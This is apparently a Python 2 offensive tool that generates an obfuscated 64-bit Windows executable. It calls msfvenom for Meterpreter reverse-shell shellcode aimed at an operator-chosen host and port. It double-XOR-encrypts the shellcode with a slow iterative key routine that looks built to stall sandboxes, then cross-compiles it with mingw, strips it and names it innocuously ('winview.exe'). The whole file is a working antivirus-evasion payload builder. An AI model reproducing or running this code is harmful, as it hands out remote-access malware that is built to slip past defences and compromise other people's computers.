#!/usr/bin/env python

import os
import random
import subprocess
import argparse


def generate_payload_shellcode(lhost, lport, payload):
    res = os.system('msfvenom -f py -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + str(lport) + ' -o shellcode.py')
    
    if res != 0:
        raise Exception('msfvenom failed with result ' + res)

    fd = open('shellcode.py', 'r')
    code = fd.read()
    fd.close()
    buf = ""

    os.remove('shellcode.py')

    exec(code)

    shellcode = [x for x in buf]
    length = len(shellcode)

    return (shellcode, length)

def xor_shellcode(buf, xorkey): 
    keylen = len(xorkey)
    return [chr(ord(x) ^ xorkey[i % keylen]) for i,x in enumerate(buf)]
    
def generate_random_key(size = 200):
    xorkey = [ord(os.urandom(1)) for _ in xrange(size)]
    return xorkey


def compute_payload_key(nbr_iter = 1000000000, key_size = 100):

    compute_key_program = """ 
#include <stdio.h>
#include <stdlib.h>

void compute(int iterations, unsigned char* u, int size) {
    for(int i = 0; i < iterations; i++) {
        int a = (i+2) % size;
        int b = (i+1) % size;
        int c = i % size;
        u[a] = (u[b] + u[c] + i) % 255; 
    } 
}

int main(int argc, char* argv[]) {

    if (argc < 3) {
        printf("usage: %s <iterations_number> <key_size>\\n", argv[0]);
        exit(1);
    }

    int key_size = atoi(argv[2]);
    int iterations_number = atoi(argv[1]);

    unsigned char *u = malloc(key_size);
    for (int i = 0; i < key_size; i++) {
        u[i] = i;
    }

    compute(iterations_number, u, key_size);
    
    for (int i = 0; i < key_size; i++) {
        printf("%d ", u[i]);
    }
    return 0;
}
"""
    fd = open('compute_key.c', 'w')
    fd.write(compute_key_program)
    fd.close()

    ret = os.system('gcc compute_key.c -o compute_key')
    
    if ret != 0:
        raise Exception('build failed with error: ' + str(ret))

    os.remove('compute_key.c')
    result = subprocess.check_output('./compute_key ' + str(nbr_iter) + ' ' + str(key_size), shell=True)
    key = [int(x) for x in result.split(' ')[:-1]]
    os.remove('compute_key')
    return key


def generate_xor_key_size():
    return random.randint(100,200)

def generate_number_of_iterations():
    return random.randint(1000000000, 2000000000)

def hex_to_string(key):
    return "".join(["\\x%02x"%ord(x) for x in key])

def byte_to_string(key):
    return "".join(["\\x%02x"%x for x in key])


def generate_payload(lhost, lport = 4444, payload = 'windows/x64/meterpreter/reverse_tcp'):
    print "[+] Loading template"

    tpl_file = open('template.c', 'r')
    tpl = tpl_file.read()
    tpl_file.close()


    print "[+] Generating payload key"

    iterations_number = generate_number_of_iterations()
    tpl = tpl.replace('[[PAYLOAD_ITER_NUMBER]]', str(iterations_number))
 
    payload_key_size = generate_xor_key_size()
    payload_key = compute_payload_key(iterations_number, payload_key_size)

    tpl = tpl.replace('[[PAYLOAD_KEY_LENGTH]]', str(payload_key_size))

    print "[+] Generating payload shellcode"
    
    payload_shellcode, payload_shellcode_length = generate_payload_shellcode(lhost, lport, payload)

    payload_static_key_length = generate_xor_key_size()
    payload_static_key = generate_random_key(payload_static_key_length)

    tpl = tpl.replace('[[PAYLOAD_STATIC_KEY]]', byte_to_string(payload_static_key))
    tpl = tpl.replace('[[PAYLOAD_STATIC_KEY_LENGTH]]', str(payload_static_key_length))

    print "[+] Obfuscating shellcode"

    # static xor
    shellcode = xor_shellcode(payload_shellcode, payload_static_key) 
    
    # dynamic xor
    shellcode = xor_shellcode(shellcode, payload_key) 

    
    tpl = tpl.replace('[[SHELLCODE_PAYLOAD]]', hex_to_string(shellcode))
    tpl = tpl.replace('[[SHELLCODE_PAYLOAD_LENGTH]]', str(payload_shellcode_length))
    
    fd = open('payload.c', 'w')
    fd.write(tpl)
    fd.close()
    
def build_payload(output = 'payload.exe', resource = None):
    print "[+] Building binary"

    ret = os.system('x86_64-w64-mingw32-gcc -c payload.c -o payload.o')

    if ret != 0:
        raise Exception('build failed with error: ' + str(ret))

    if resource:
        print "[+] Adding ressources"
        ret = os.system('x86_64-w64-mingw32-windres -F pe-x86-64 ' + resource + ' resources.o')

        if ret != 0:
            raise Exception('build failed with error: ' + str(ret))

        ret = os.system('x86_64-w64-mingw32-gcc -mwindows resources.o payload.o -o ' + output)

        if ret != 0:
            raise Exception('build failed with error: ' + str(ret))

        os.remove('resources.o')
    else:
        ret = os.system('x86_64-w64-mingw32-gcc -mwindows payload.o -o ' + output)

        if ret != 0:
            raise Exception('build failed with error: ' + str(ret))
            
    os.remove('payload.o')


def strip_payload(output = 'payload.exe'):
    print "[+] Stripping binary"
    ret = os.system('strip --strip-unneeded -X ' + output)

    if ret != 0:
        raise Exception('strip failed with error: ' + str(ret))

def generate(lhost, lport, payload, resource, output):
    generate_payload(lhost, lport,payload)
    build_payload(output, resource)
    strip_payload(output)

def main():
    parser = argparse.ArgumentParser(description='Generate an objuscated payload in 64 bit using msfvenom and mingw32.')
    parser.add_argument('-p', '--payload', default='windows/x64/meterpreter/reverse_https', type=str, help='metasploit payload')
    parser.add_argument('lhost', type=str, default="192.168.4.1", help='Host IP Address')
    parser.add_argument('lport', type=int, default="4444", help="Listenning port")
    parser.add_argument('-o', '--output', default='winview.exe', help='Output PE name')
    parser.add_argument('-r', '--resource', default="ressources.rc", help='Resource file')

    args = parser.parse_args()

    generate(args.lhost, args.lport, args.payload, args.resource, args.output)

    

main()